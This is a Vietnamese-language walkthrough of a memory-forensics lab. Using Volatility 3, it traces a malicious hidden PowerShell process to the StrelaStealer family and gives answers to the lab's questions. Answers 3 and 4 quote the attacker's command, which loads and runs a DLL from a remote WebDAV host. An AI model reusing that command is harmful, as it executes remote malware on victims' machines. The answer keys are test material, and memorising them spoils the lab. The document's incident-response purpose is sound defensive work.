# Reveal Lab

## 1. Bối cảnh 

Bài Lab mô phỏng một sự cố tại một tổ chức tài chính. Hệ thống SIEM phát hiện hoạt động bất thường trên một máy trạm có quyền truy cập dữ liệu tài chính nhạy cảm. Nghi ngờ máy đã bị xâm nhập, đội ứng cứu thu thập một bản memory dump từ máy bị ảnh hưởng.

Nhiệm vụ của mình là đóng vai chuyên gia điều tra số: phân tích memory dump bằng Volatility 3 để xác định các tiến trình độc hại và dòng lệnh liên quan, truy vết nguồn gốc của hoạt động bất thường, đối chiếu phát hiện với dữ liệu tình báo mối đe dọa, từ đó đánh giá phạm vi ảnh hưởng và đề xuất hướng khoanh vùng sự cố.

## Câu 1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

- Ở câu này mình bắt đầu bằng việc liệt kê tiến trình trong memory dump với `windows.pstree` và `windows.cmdline` để tìm cha-con hoặc dòng lệnh bất thường.
- Sau đó mình dùng plugin `windows.malfind` để tìm các vùng nhớ có quyền `PAGE_EXECUTE_READWRITE` không gắn với file nào trên đĩa, dấu hiệu của mã bị inject.
- Mình phát hiện thấy có một tiến trình powershell bất thường có PID là `3692`

<img width="1167" height="747" alt="image" src="https://github.com/user-attachments/assets/72ac3bfa-bc85-47f8-abb7-5a2f62c82d86" />

**Đáp án:** `powershell.exe`

## Câu 2: Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

- Dựa vào kết quả ở câu 1 mình đã tìm được PID của tiến trình `powershell.exe` là `3692`
- Sau đó mình tiếp tục sử dụng plugin `windows.pstree` để tìm các cặp cây tiến trình cha con bằng lệnh `vol -f 192-Reveal.dmp windows.pstree | grep "3692"` và mình tìm được PPID của tiến trình 
`3692` là `4120`

<img width="1671" height="146" alt="image" src="https://github.com/user-attachments/assets/1c6e5939-24f1-42f3-8cf4-1045afdc013c" />


## Câu 3: Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

- Từ tiến trình độc hại xác định ở câu 1 (PID 3692, `powershell.exe`), mình dùng plugin `windows.cmdline` để xem dòng lệnh đầy đủ: `vol -f 192-Reveal.dmp windows.cmdline | grep "3692"`.
- Mình phát hiện thấy PowerShell chạy ẩn (`-windowstyle hidden`), dùng `net use` để kết nối tới thư mục WebDAV `\\45.9.74.32@8888\davwwwroot\`, sau đó dùng `rundll32` nạp file **3435.dll** từ chia sẻ này và gọi hàm `entry` .

<img width="1275" height="65" alt="image" src="https://github.com/user-attachments/assets/c6ea73be-405c-4d7c-80c7-f50f50ceefc1" />

**Đáp án:** `3435.dll`

## Câu 4: Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

- Mình dùng lại dòng lệnh của tiến trình `powershell.exe` đã tìm được ở câu 3 : `net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`.
- Phân tích đường dẫn UNC `\\45.9.74.32@8888\davwwwroot\`, thành phần sau địa chỉ máy chủ và cổng là **davwwwroot**. Đây là thư mục chia sẻ qua WebDAV mà kẻ tấn công kết nối tới bằng `net use`

<img width="1251" height="60" alt="image" src="https://github.com/user-attachments/assets/f67344de-e5eb-4720-8ebc-324f0e0e5d6a" />

**Đáp án:** `davwwwroot`

## Câu 5: What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

- Từ dòng lệnh ở câu 3, mình thấy rằng kẻ tấn công dùng tiện ích hợp lệ của Windows là `rundll32` để nạp và chạy file `3435.dll` từ máy chủ từ xa: `rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`.
- Mình tra cứu trên MITRE ATT&CK và thấy hành vi này tương ứng với sub-technique **T1218.011 - System Binary Proxy Execution: Rundll32**, thuộc kỹ thuật T1218 (System Binary Proxy Execution) của tactic Defense Evasion.

 **Đáp án:** `T1218.011`

## Câu 6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

- Ở câu này, mình dùng plugin `windows.getsids` của Volatility 3 để xem token bảo mật gắn với tiến trình: `vol -f 192-Reveal.dmp windows.getsids | grep "3692"`.
- Kết quả cho thấy SID `S-1-5-21-3274565340-3808842250-3617890653-1001` ứng với tài khoản **Elon**, vì vậy tiến trình độc hại chạy dưới quyền người dùng `Elon.`

<img width="1067" height="376" alt="image" src="https://github.com/user-attachments/assets/e42067b0-78b4-4123-87f0-2072476d293c" />

## Câu 7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

-  Từ các IOC thu được ở câu 3 và câu 4, mình lấy địa chỉ IP máy chủ payload `45.9.74.32` và tra cứu trên VirusTotal. Kết quả cho thấy 13/92 vendor gắn cờ IP này là độc hại.
- Ở mục Crowdsourced context, IP này được ghi nhận có liên quan tới hoạt động của **StrelaStealer** (theo nguồn Cluster25).

 <img width="1901" height="912" alt="image" src="https://github.com/user-attachments/assets/1a2e3ff4-3cea-46f4-a83d-4340c9e53935" />

